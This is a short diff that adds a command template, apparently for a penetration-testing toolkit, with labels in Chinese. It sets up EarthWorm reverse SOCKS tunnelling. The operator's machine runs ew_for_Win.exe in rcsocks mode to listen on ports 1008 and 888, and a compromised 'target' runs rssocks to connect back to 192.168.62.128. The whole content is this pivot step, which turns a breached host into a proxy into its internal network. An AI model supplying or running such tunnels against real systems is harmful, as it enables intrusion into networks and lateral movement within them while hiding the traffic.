@@ -1,0 +1,14 @@
+<sfjt>inject</sfjt>
+<cs1mc>本地Sockcs代理端口</cs1mc>
+<cs2mc>反弹监听端口</cs2mc>
+<zbz>1</zbz>
+<bz1>
+<cmd>ew_for_Win.exe -s rcsocks -l <cs1/> -e <cs2/></cmd>
+</bz1>
+<bz>Socks 蚯蚓
+
+本机：ew_for_Win.exe -s rcsocks -l 1008 -e 888
+
+目标：ew_for_Win.exe -s rssocks -d 192.168.62.128 -e 888
+
+</bz>
